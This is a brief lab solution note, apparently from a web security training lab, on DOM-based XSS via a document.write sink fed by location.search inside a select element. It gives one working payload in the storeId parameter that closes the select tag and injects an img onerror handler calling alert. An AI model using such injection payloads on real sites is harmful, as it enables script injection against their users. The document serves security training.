# Lab: DOM XSS in document.write sink using source location.search inside a select element

vuln: DOM XSS in stock checker functionality.
Task: Break down select element and call alert() function.
Analysis:
    &storeId=<option>1</select><img%20src=1%20onerror="alert(1)"></option>